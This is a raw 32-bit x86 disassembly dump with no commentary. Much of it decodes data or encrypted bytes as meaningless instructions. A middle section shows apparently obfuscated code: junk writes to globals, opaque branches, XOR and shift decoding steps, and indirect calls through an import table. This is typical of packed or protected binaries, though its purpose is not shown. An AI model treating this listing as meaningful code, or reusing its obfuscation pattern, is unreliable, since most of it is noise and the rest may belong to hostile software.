  404c24:	clc    
  404c25:	and    BYTE PTR [esi-0x6c253ead],ch
  404c2b:	(bad)  
  404c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c2e:	gs ret 0xa53e
  404c32:	pop    esi
  404c33:	aam    0x4e
  404c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c36:	shl    BYTE PTR [esi],1
  404c38:	retf   
  404c39:	inc    ebx
  404c3a:	inc    ebx
  404c3b:	or     BYTE PTR [edi-0x7ab69258],0xe5
  404c42:	jns    0x404c7e
  404c44:	or     DWORD PTR [ebx+esi*4-0x32],0xe02d6035
  404c4c:	not    DWORD PTR ds:0x32d719b0
  404c52:	cmp    DWORD PTR [eax-0x1fb0c8d],ebx
  404c58:	inc    eax
  404c59:	add    ebp,DWORD PTR [ebp-0x3f03d668]
  404c5f:	cli    
  404c60:	xchg   ebx,eax
  404c61:	and    BYTE PTR [esi+0x1fd351aa],bh
  404c67:	fsub   DWORD PTR [edi+0xf]
  404c6a:	mov    bh,0x1e
  404c6c:	adc    ebp,DWORD PTR [ebx+0x7387d9be]
  404c72:	(bad)  
  404c73:	mov    eax,0x28991faa
  404c78:	or     BYTE PTR [esi],dh
  404c7a:	das    
  404c7b:	fidiv  DWORD PTR [ebx+0x77]
  404c7e:	sbb    eax,DWORD PTR ds:0x1a63c8ca
  404c84:	cdq    
  404c85:	and    DWORD PTR [esp+esi*1-0x69],0xa783a5c7
  404c8d:	mov    bl,dl
  404c8f:	jne    0x404c68
  404c91:	xchg   esi,eax
  404c92:	cld    
  404c93:	pop    eax
  404c94:	das    
  404c95:	popf   
  404c96:	jl     0x404c77
  404c98:	push   ecx
  404c99:	mov    ?,WORD PTR [ecx+esi*8+0x3c9df6f4]
  404ca0:	std    
  404ca1:	ficom  DWORD PTR [ebp+0x19d5aaf4]
  404ca7:	aas    
  404ca8:	mov    BYTE PTR cs:[ecx+0x19],0xe0
  404cad:	cmp    DWORD PTR [eax+ebx*2],edx
  404cb0:	adc    dl,BYTE PTR [eax+0x3e45c8df]
  404cb6:	pop    edx
  404cb7:	rol    DWORD PTR [edi+0x1b1cbadc],0x39
  404cbe:	sub    dl,bh
  404cc0:	cwde   
  404cc1:	ret    0x801e
  404cc4:	pop    edx
  404cc5:	(bad)  
  404cc7:	xchg   edi,eax
  404cc8:	test   eax,0xbac13cac
  404ccd:	cdq    
  404cce:	sub    BYTE PTR [edx],bl
  404cd0:	cli    
  404cd1:	push   0x59
  404cd3:	cwde   
  404cd4:	jmp    0x1c936d22
  404cd9:	push   edx
  404cda:	je     0x404c61
  404cdc:	leave  
  404cdd:	(bad)  
  404cde:	stc    
  404cdf:	ret    0x7b2d
  404ce2:	cwde   
  404ce3:	sub    al,0x4f
  404ce5:	mov    ecx,0xe15ba823
  404cea:	cmp    eax,0xe2f6d1e7
  404cef:	int    0x86
  404cf1:	ss mov edi,0x34fe3c37
  404cf7:	mov    cl,0x12
  404cf9:	mov    al,ds:0x3ca28105
  404cfe:	mov    dh,ch
  404d00:	dec    edi
  404d01:	clc    
  404d02:	xor    BYTE PTR [esi+0x9],ah
  404d05:	jmp    0xf0fd:0x30d18504
  404d0c:	sub    DWORD PTR [edi+0x63c10c64],edx
  404d12:	pop    esi
  404d13:	cdq    
  404d14:	fsubr  st(5),st
  404d16:	test   BYTE PTR [eax],bl
  404d18:	and    esp,DWORD PTR [ebx]
  404d1a:	in     al,dx
  404d1b:	repz (bad) 
  404d1d:	loop   0x404d67
  404d1f:	cmp    bl,BYTE PTR [ecx+0x3e22a41e]
  404d25:	xchg   esp,eax
  404d26:	in     eax,dx
  404d27:	adc    DWORD PTR [edi],ecx
  404d29:	cmp    eax,0x988aa92d
  404d2e:	jmp    0x404cef
  404d30:	or     al,0xc2
  404d32:	sub    al,0x86
  404d34:	int    0x60
  404d36:	mov    eax,0x30bc6f2
  404d3b:	jae    0x404cfe
  404d3d:	xor    al,dl
  404d3f:	clc    
  404d40:	and    eax,0x58212866
  404d45:	fst    QWORD PTR [ebx+edx*4+0x25]
  404d49:	ficom  DWORD PTR [ecx-0x4ca206a8]
  404d4f:	push   ebx
  404d50:	push   edi
  404d51:	(bad)  
  404d53:	es js  0x404db0
  404d56:	mov    dh,BYTE PTR [edx+0x189883f]
  404d5c:	xor    eax,0x559bf63b
  404d61:	int    0x8f
  404d63:	pusha  
  404d64:	xchg   ebp,eax
  404d65:	lods   eax,DWORD PTR ds:[esi]
  404d66:	(bad)  
  404d67:	(bad)  
  404d68:	xor    bh,BYTE PTR [ebx-0x5fcdb2ac]
  404d6e:	sub    bh,BYTE PTR [eax+0x57560c2f]
  404d74:	pop    es
  404d75:	jmp    0x404d0f
  404d77:	pop    esi
  404d78:	mov    eax,ds:0xec78eace
  404d7d:	pusha  
  404d7e:	add    al,0xf8
  404d80:	jp     0x404dc4
  404d82:	jns    0x404dec
  404d84:	data16 fcmovnb st,st(2)
  404d87:	lods   eax,DWORD PTR ds:[esi]
  404d88:	aas    
  404d89:	or     eax,0x5b180157
  404d8e:	and    eax,DWORD PTR [esi-0x75841ea2]
  404d94:	sub    cl,ch
  404d96:	inc    edx
  404d97:	jmp    0xdd573799
  404d9c:	xchg   esi,eax
  404d9d:	call   0x6a51c8d2
  404da2:	dec    eax
  404da3:	mov    ebp,edi
  404da5:	mov    edx,0xbf372514
  404daa:	or     eax,DWORD PTR [edx-0x7b]
  404dad:	test   eax,0x731d6dad
  404db2:	jbe    0x404dd0
  404db4:	mov    al,0x94
  404db6:	cmp    edi,DWORD PTR [esi-0x70cc7714]
  404dbc:	mov    bl,al
  404dbe:	aaa    
  404dbf:	mov    ecx,0x160756d6
  404dc4:	popa   
  404dc5:	cld    
  404dc6:	jle    0x404e36
  404dc8:	inc    ecx
  404dc9:	lods   eax,DWORD PTR ds:[esi]
  404dca:	sbb    eax,DWORD PTR es:[ecx+0x6271a19b]
  404dd1:	mov    esi,0x9450715f
  404dd6:	fs retf 
  404dd8:	icebp  
  404dd9:	pop    edi
  404dda:	mov    al,ds:0xd61330ab
  404ddf:	lods   al,BYTE PTR ds:[esi]
  404de0:	xchg   esp,eax
  404de1:	sub    DWORD PTR [ebx+0x40],esi
  404de4:	scas   eax,DWORD PTR es:[edi]
  404de5:	loop   0x404e59
  404de7:	out    dx,al
  404de8:	data16 adc dh,ch
  404deb:	adc    bh,BYTE PTR [eax+esi*4]
  404dee:	shr    BYTE PTR [ebx],cl
  404df0:	es scas eax,DWORD PTR es:[edi]
  404df2:	mov    al,0x25
  404df4:	mov    ecx,0x333595da
  404df9:	xchg   ebp,eax
  404dfa:	leave  
  404dfb:	(bad)  
  404dfc:	adc    ecx,DWORD PTR [esi]
  404dfe:	push   ecx
  404dff:	outs   dx,DWORD PTR ds:[esi]
  404e00:	push   esi
  404e01:	stc    
  404e02:	fist   DWORD PTR [esi-0x15]
  404e05:	pop    ebp
  404e06:	push   0x44
  404e08:	imul   edx,esi,0x2a
  404e0b:	mov    ebx,0xafe26f23
  404e10:	push   ss
  404e11:	push   edi
  404e12:	jl     0x404e88
  404e14:	inc    edi
  404e15:	sbb    bl,ch
  404e17:	mov    al,ds:0x2b31c9b5
  404e1c:	jnp    0x404dc2
  404e1e:	sahf   
  404e1f:	popa   
  404e20:	xor    eax,DWORD PTR [eax]
  404e22:	mov    DWORD PTR [esi-0xdda6a21],esi
  404e28:	stos   DWORD PTR es:[edi],eax
  404e29:	fs aam 0x9e
  404e2c:	mov    ebx,ebx
  404e2e:	scas   eax,DWORD PTR es:[edi]
  404e2f:	jle    0x404e04
  404e31:	jmp    0xeb4cdc14
  404e36:	adc    esp,DWORD PTR [esi+ebx*8+0x7f]
  404e3a:	aad    0x4d
  404e3c:	aad    0xd4
  404e3e:	pushf  
  404e3f:	mov    fs,WORD PTR [esi+0x3c3d486a]
  404e45:	mov    al,ds:0x8cb3922a
  404e4a:	inc    DWORD PTR [esi+0x18]
  404e4d:	loop   0x404e2d
  404e4f:	into   
  404e50:	push   ecx
  404e51:	retf   
  404e52:	mov    edi,0x25359fb0
  404e57:	inc    esi
  404e58:	mov    ch,0xa4
  404e5a:	or     bl,BYTE PTR [ebp+0x738acc3a]
  404e60:	cmp    al,0xbf
  404e62:	cmp    ch,BYTE PTR [edx+eiz*4+0xa]
  404e66:	lahf   
  404e67:	dec    esp
  404e68:	jmp    0x404e30
  404e6a:	cmp    BYTE PTR [ebp-0x26],cl
  404e6d:	add    BYTE PTR [ebp+0x688eec3],bl
  404e73:	out    0x66,al
  404e75:	adc    bh,BYTE PTR [ecx+ebp*4+0x47]
  404e79:	mov    DWORD PTR [edx],eax
  404e7b:	xor    ah,dl
  404e7d:	fild   DWORD PTR [ebp-0x4d]
  404e80:	mov    ds:0x776378f0,eax
  404e85:	rol    BYTE PTR [ebp+edi*1+0x642c195],1
  404e8c:	cs in  eax,0xfa
  404e8f:	or     eax,0xafbd10bd
  404e94:	adc    al,0x89
  404e96:	std    
  404e97:	push   ss
  404e98:	ret    0x3eeb
  404e9b:	out    dx,eax
  404e9c:	aaa    
  404e9d:	mov    ecx,DWORD PTR [esi]
  404e9f:	mov    ebx,0x546deb7b
  404ea4:	mov    esi,0x43054599
  404ea9:	(bad)  [ebx]
  404eab:	push   ecx
  404eac:	cmp    eax,0xe595942
  404eb1:	push   esp
  404eb2:	std    
  404eb3:	not    DWORD PTR [ecx+0x4f]
  404eb6:	push   es
  404eb7:	add    al,0xdc
  404eb9:	dec    edx
  404eba:	pop    ss
  404ebb:	mov    ah,0xc4
  404ebd:	or     bl,BYTE PTR [edx-0x2e]
  404ec0:	into   
  404ec1:	cmp    ebp,edi
  404ec3:	jnp    0x404e5d
  404ec5:	xchg   BYTE PTR [edx-0x30cda852],ah
  404ecb:	lea    ebp,[ebx+0x21bade2c]
  404ed1:	mov    al,BYTE PTR [esi]
  404ed3:	ret    0x1b77
  404ed6:	push   ebx
  404ed7:	imul   ebp,DWORD PTR [eax+eiz*4-0x2f8f3c8b],0x216a21f2
  404ee2:	fild   DWORD PTR [esi-0x4d]
  404ee5:	jb     0x404f3c
  404ee7:	out    0xbc,eax
  404ee9:	dec    edx
  404eea:	repnz int 0x2
  404eed:	jg     0x404e77
  404eef:	or     cl,BYTE PTR [esi-0x5989158e]
  404ef5:	fcmovbe st,st(6)
  404ef7:	in     al,dx
  404ef8:	jb     0x404f24
  404efa:	fild   QWORD PTR [edi+0x41]
  404efd:	sahf   
  404efe:	inc    esi
  404eff:	rcl    ch,1
  404f01:	enter  0xc5d7,0x82
  404f05:	fsub   QWORD PTR [esi+0x1fa68b05]
  404f0b:	adc    eax,0x674534b5
  404f10:	dec    edx
  404f11:	daa    
  404f12:	xor    al,0x9b
  404f14:	int3   
  404f15:	or     ecx,esp
  404f17:	dec    edi
  404f18:	js     0x404f70
  404f1a:	push   edx
  404f1b:	pusha  
  404f1c:	or     al,0x15
  404f1e:	and    eax,0xb63c8c84
  404f23:	pop    esp
  404f24:	clc    
  404f25:	push   es
  404f26:	vpackssdw ymm3,ymm6,YMMWORD PTR [esi]
  404f2a:	retf   
  404f2b:	adc    eax,0x81e4550b
  404f30:	sbb    eax,0x4282db
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x4282e7
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283fb,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x4283d7,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x4283e3,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x4283e3,0x0
  404f72:	mov    DWORD PTR ds:0x428373,ebx
  404f78:	mov    DWORD PTR ds:0x4283eb,0x56b3
  404f82:	mov    DWORD PTR ds:0x4282cb,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42829f,ebx
  404f97:	mov    DWORD PTR ds:0x4282d7,0x5683
  404fa1:	cmp    DWORD PTR ds:0x4283e3,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428dec
  404fbc:	and    edx,DWORD PTR ds:0x428383
  404fc2:	sub    DWORD PTR ds:0x4282af,ecx
  404fc8:	or     DWORD PTR ds:0x4282a3,0xf0b
  404fd2:	adc    DWORD PTR ds:0x4281df,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x4283c3
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x4281cb,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x4281c3
  404ff2:	xor    DWORD PTR ds:0x428303,edx
  404ff8:	mov    edx,DWORD PTR ds:0x4282d7
  404ffe:	add    DWORD PTR ds:0x4283fb,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428303
  40500c:	add    DWORD PTR ds:0x4282db,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x4283e3,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x4283ef,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x4281d7,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283ff,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x4282ef,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x4281e3,0x4282c7
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x4283db,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x4283eb,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x4282db,0x4283e7
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x4282d3,0x4282f3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x4282a7,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x4283db,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x4283eb,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283f7,0x42829b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x4282c3,0x4282af
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282ff,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x4282df,0x4282bb
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x4281c7,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x4283eb,0x0
  40512f:	mov    DWORD PTR ds:0x4281fb,edx
  405135:	mov    DWORD PTR ds:0x4283cb,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x4281db,0x795c
  40514c:	cmp    DWORD PTR ds:0x4283eb,0x0
  405153:	ja     0x40517c
  405159:	push   0x42800c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428e14
  40516c:	or     DWORD PTR ds:0x4282d3,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428407
  40517c:	adc    ecx,DWORD PTR ds:0x4281eb
  405182:	xor    DWORD PTR ds:0x4281db,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x4282ef,edx
  405192:	cmp    DWORD PTR ds:0x42834b,0x0
  405199:	mov    DWORD PTR ds:0x428377,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428357,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x42834b,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428e18
  4051d1:	inc    DWORD PTR ds:0x4282e7
  4051d7:	mov    ecx,DWORD PTR ds:0x428227
  4051dd:	mov    edx,DWORD PTR ds:0x428427
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x42834b,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42821f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x4282d3,edx
  405201:	mov    edx,DWORD PTR ds:0x428237
  405207:	mov    ecx,DWORD PTR ds:0x428427
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x4283df,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x4282ef
  405233:	sub    DWORD PTR ds:0x4281f3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x4283cb,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x4281d7,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x4282df,0x4281e3
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283fb,0x4282c7
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283f3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x4281cb,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428303,0x0
  40529a:	mov    DWORD PTR ds:0x428293,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x4282d3
  4052aa:	mov    DWORD PTR ds:0x42835b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428403,0x6b40
  4052c3:	mov    DWORD PTR ds:0x4282eb,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428303,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x4280c9
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428e1c
  4052ea:	add    edx,DWORD PTR ds:0x4282bb
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x4281e3
  4052fc:	and    DWORD PTR ds:0x4281ef,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x4282c7
  40530f:	add    DWORD PTR ds:0x428303,edx
  405315:	mov    edx,DWORD PTR ds:0x4282eb
  40531b:	add    DWORD PTR ds:0x4281d3,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428357,0x42828f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428373,0x0
  40533c:	mov    DWORD PTR ds:0x42836f,edi
  405342:	mov    DWORD PTR ds:0x4282d7,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42837b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283f7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428373,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428e20
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283ff,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42843f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x4283df,ecx
  405396:	mov    ecx,DWORD PTR ds:0x4282af
  40539c:	xor    DWORD PTR ds:0x4281bb,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x4282db,edx
  4053ae:	cmp    DWORD PTR ds:0x42835b,0x0
  4053b5:	mov    DWORD PTR ds:0x4281c7,edi
  4053bb:	not    DWORD PTR ds:0x42829b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281f7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42835b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428e24
  4053f6:	sub    ecx,DWORD PTR ds:0x4281fb
  4053fc:	sub    DWORD PTR ds:0x42829b,0x6432
  405406:	or     DWORD PTR ds:0x4282bf,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x4281ef
  405416:	sub    DWORD PTR ds:0x4283f3,edi
  40541c:	mov    DWORD PTR ds:0x42829b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x4282d7,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x42834f,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283ff
  405450:	sub    edx,DWORD PTR ds:0x4281b3
  405456:	mov    DWORD PTR ds:0x4283ff,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	jge    0x4053fd
  40546f:	arpl   WORD PTR [esi+eiz*8-0x61e7e747],di
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    cl,dh
  40547a:	add    eax,DWORD PTR [edi-0x21]
  40547d:	push   eax
  40547e:	sti    
  40547f:	fst    DWORD PTR [ecx+0x225080d9]
  405485:	das    
  405486:	stos   BYTE PTR es:[edi],al
  405487:	add    esp,DWORD PTR [edx+0x17313a39]
  40548d:	jmp    0x7e1cdfcc
  405492:	daa    
  405493:	push   esi
  405494:	adc    al,0xae
  405496:	loop   0x405424
  405498:	fs jne 0x4054a1
  40549b:	sti    
  40549c:	mov    ds:0xfc8295dd,eax
  4054a1:	mov    al,0x68
  4054a3:	mov    bl,0x44
  4054a5:	sub    DWORD PTR [esi-0x617d291b],0x24
  4054ac:	cmp    DWORD PTR [edx-0x6e909060],esi
  4054b2:	int3   
  4054b3:	dec    ebp
  4054b4:	call   DWORD PTR ds:0x3e81125f
  4054ba:	inc    ecx
  4054bb:	add    BYTE PTR es:[eax+esi*1-0x1a26a7f9],al
  4054c3:	xchg   ebp,eax
  4054c4:	cs cli 
  4054c6:	mov    ch,bl
  4054c8:	cmc    
  4054c9:	es cwde 
  4054cb:	jle    0x4054b7
  4054cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ce:	cmp    ecx,esi
  4054d0:	rol    DWORD PTR [eax+ebp*8+0x66dbeea7],0xc8
  4054d8:	add    eax,0xffffffaa
  4054db:	xchg   BYTE PTR [esi-0x5cb67d87],cl
  4054e1:	in     eax,0x90
  4054e3:	dec    edi
  4054e4:	sbb    DWORD PTR [edi+0x30],0x5f
  4054e8:	leave  
  4054e9:	dec    edi
  4054ea:	ins    BYTE PTR es:[edi],dx
  4054eb:	imul   esp,DWORD PTR ds:0xd8087ca0,0x19ff0234
  4054f5:	pop    ds
  4054f6:	pop    ebp
  4054f7:	sbb    DWORD PTR [ecx],edx
  4054f9:	das    
  4054fa:	retf   
  4054fb:	fwait
  4054fc:	mov    ebx,0x8c60073e
  405501:	cmp    eax,0xe2734ab4
  405506:	dec    edi
  405507:	adc    bh,BYTE PTR [ecx-0x45369b4b]
  40550d:	aad    0x84
  40550f:	fisttp WORD PTR [ebx+0x65081663]
  405515:	repz test eax,0x6dea4ea5
  40551b:	cmp    al,0xa3
  40551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551e:	ja     0x40559e
  405520:	rol    BYTE PTR [edx-0x6a],1
  405523:	loop   0x4054c1
  405525:	adc    eax,0xfdeccfda
  40552a:	mov    dh,0xdc
  40552c:	or     edx,DWORD PTR [edi-0x7a]
  40552f:	push   esi
  405530:	jae    0x405543
  405532:	push   esp
  405533:	inc    ecx
  405534:	sar    BYTE PTR [esi+0x3408d037],cl
  40553a:	lahf   
  40553b:	mov    ebp,0x87392c7a
  405540:	cmp    BYTE PTR [ecx-0x26],0xd
  405544:	data16 jno 0x405579
  405547:	sti    
  405548:	pop    esi
  405549:	sbb    eax,0xe0686a33
  40554e:	test   eax,0x445996b8
  405553:	es jnp 0x405583
  405556:	xlat   BYTE PTR ds:[ebx]
  405557:	mov    bl,BYTE PTR [edi+0x7dc20493]
  40555d:	push   ebp
  40555e:	popf   
  40555f:	test   bh,bh
  405561:	add    BYTE PTR [edi],0x11
  405564:	cdq    
  405565:	out    dx,al
  405566:	mov    ebp,0x9c018ca1
  40556b:	xor    bh,ch
  40556d:	in     al,0x73
  40556f:	sbb    eax,0x8645d482
  405574:	(bad)  
  405575:	jp     0x40558c
  405577:	push   es
  405578:	imul   ecx,DWORD PTR [ecx+0x4dc29088],0xfffffff2
  40557f:	retf   0xb10
  405582:	test   al,0x60
  405584:	jae    0x4055ab
  405586:	stos   BYTE PTR es:[edi],al
  405587:	(bad)  
  405588:	jns    0x405510
  40558a:	add    al,0x5c
  40558c:	xchg   edi,eax
  40558d:	arpl   WORD PTR [ebx],bx
  40558f:	push   ss
  405590:	xchg   edx,eax
  405591:	out    0xc6,al
  405593:	and    BYTE PTR [edx+0x28020c8b],dh
  405599:	adc    esp,DWORD PTR [ebp-0x4c]
  40559c:	pusha  
  40559d:	mov    al,0x47
  40559f:	mov    al,ds:0xf5efc3c8
  4055a4:	push   eax
  4055a5:	xor    dh,ah
  4055a7:	inc    edi
  4055a8:	mov    dl,0x17
  4055aa:	lods   eax,DWORD PTR ds:[esi]
  4055ab:	mov    esi,0xf5d077e6
  4055b0:	pop    ebx
  4055b1:	in     eax,0x49
  4055b3:	cwde   
  4055b4:	jae    0x405567
  4055b6:	cmp    BYTE PTR [ebx],0xeb
  4055b9:	mov    dl,BYTE PTR [eax+0x7d]
  4055bc:	popf   
  4055bd:	push   edi
  4055be:	sub    DWORD PTR [eax-0x7f707c65],0xfffffff9
  4055c5:	scas   eax,DWORD PTR es:[edi]
  4055c6:	mov    cl,0x5d
  4055c8:	shr    DWORD PTR [edi+0x4e],0xed
  4055cc:	cmc    
  4055cd:	mov    al,ds:0xdded0abc
  4055d2:	and    al,0xba
  4055d4:	add    dl,BYTE PTR [ebx]
  4055d6:	lods   al,BYTE PTR ds:[esi]
  4055d7:	js     0x4055f9
  4055d9:	rcl    edi,cl
  4055db:	or     DWORD PTR [edx-0x30],0x80198ca5
  4055e2:	in     eax,0x8d
  4055e4:	push   cs
  4055e5:	in     al,0x40
  4055e7:	in     al,0x5b
  4055e9:	jno    0x4055dd
  4055eb:	mov    edi,0x82c79c5c
  4055f0:	loope  0x405634
  4055f2:	fst    QWORD PTR [ecx]
  4055f4:	inc    esp
  4055f5:	sbb    al,cl
  4055f7:	cmp    al,0xd
  4055f9:	call   0xdf2f:0x5d7406e3
  405600:	xchg   esi,eax
  405601:	push   ecx
  405602:	rcl    BYTE PTR [esi+0x3],0x84
  405606:	push   edi
  405607:	cmp    ecx,DWORD PTR [ebx]
  405609:	mov    ecx,0x5a3b091d
  40560e:	in     al,0xf0
  405610:	mov    esp,0xa844051a
  405615:	in     eax,dx
  405616:	scas   al,BYTE PTR es:[edi]
  405617:	sbb    BYTE PTR [ebp+0x57],dh
  40561a:	jae    0x405642
  40561c:	test   al,0x15
  40561e:	mov    edx,DWORD PTR [esi]
